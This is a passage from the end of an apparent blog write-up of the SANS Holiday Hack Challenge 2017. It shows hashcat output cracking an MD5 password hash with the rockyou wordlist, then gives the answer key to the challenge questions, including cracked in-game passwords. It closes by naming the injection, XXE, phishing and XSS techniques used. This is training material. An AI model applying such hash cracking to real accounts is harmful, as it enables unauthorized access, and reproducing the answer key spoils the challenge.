<a href="https://jhalon.github.io/images/shh95.png"><img src="https://jhalon.github.io/images/shh95.png"></a>

Now that we have Santas password hash, let's save it to a file and use HashCat to crack it.

```console
---snip---
 
[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => [s]tatus [p]ause [r]esd8b4c05a35b0513f302a85c409b4aab3:001cookielips001 
                                         
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: d8b4c05a35b0513f302a85c409b4aab3
Time.Started.....: Thu Jan 11 15:08:18 2018 (5 secs)
Time.Estimated...: Thu Jan 11 15:08:23 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  3070.7 kH/s (0.59ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 14272405/14343297 (99.51%)
Rejected.........: 1941/14272405 (0.01%)
Restore.Point....: 14268309/14343297 (99.48%)
Candidates.#1....: 00257979 -> 0012093760
HWMon.Dev.#1.....: N/A

Started: Thu Jan 11 15:08:17 2018
Stopped: Thu Jan 11 15:08:24 2018
```

Great, we cracked the password! Now that we have Santas real password, we are able to access the Letter to Santa.

<a href="https://jhalon.github.io/images/shh96.png"><img src="https://jhalon.github.io/images/shh96.png"></a>

After we unlock all the page, we can go back to our Stocking and see a new NPC Converstaion with Glinda the Good Witch of Oz!

<a href="https://jhalon.github.io/images/shh97.png"><img src="https://jhalon.github.io/images/shh97.png"></a>

## Answers

Now that we have everything unlocked and completed, let's answer the questions:

1. Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

The title of the first page of The Great Book is "__About This Book...__".

2. Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
The topic of the second page of The Great Book is the creation of flying animals in Oz, which lead to the creation of flying reindeers.

Alabaster Snowball's password is __stream_unhappy_buy_loss__.

3. The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

The name of the share on hhc17-smb-server is __FileStor__.

4. Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?

The fourth page of The Great Book speaks of the battles between Munchkins and Elves, the creation of the Lollipop Guild, and their infiltration in the North Pole population.

5. How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

It takes four infractions to be marked as naughty on Santa's list. And the 6 Moles are as follows:

* Boq Questrian
* Bini Aru
* Sheri Lewis
* Kirsty Evans
* Nina Fitzgerald
* Beverly Khalil

The discussion between us, Sam the Snowman, and Bumble informs us that the person throwing giant snowballs is Bumble, the Abominable Snow Monster.

6. The North Pole engineering team has introduced an Elf as a Service (EaaS. platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

The title of the first page of The Great Book is "__The Dreaded Inter-Dimensional Tornadoes.__"

7. Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

The seventh page of The Great Book gives us details regarding the Witches of Oz, their power, and their neutrality during the Great Schism.

8. Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?

The letter was written by the Wizard of Oz, Santa's good friend.

9. Which character is ultimately the villain causing the giant snowball problem? What is the villain's motive?

The villain causing the giant snowball problem is Glinda, the "Good" Witch. She cast a spell on Bumble to make him throw giant snowballs, in order to create an all-out war between Elves and Munchkins. This would have allowed her to make a profit, by selling spells to both sides of the war.

## Conclusion

As always, SANS has done an amazing job for this year’s Holiday Hack! Although I liked the mini-game from last year, this years was, ok. But - the technical portion, including the LDAP Injection, XXE, Phishing, DDE Attack, XSS Attacks, and some Crypto was a great learning experience and especially showed much of what can occur in the real world, and the outcome of it.

Really looking forward to what's to come next year!

Cheers everyone, thanks for reading!
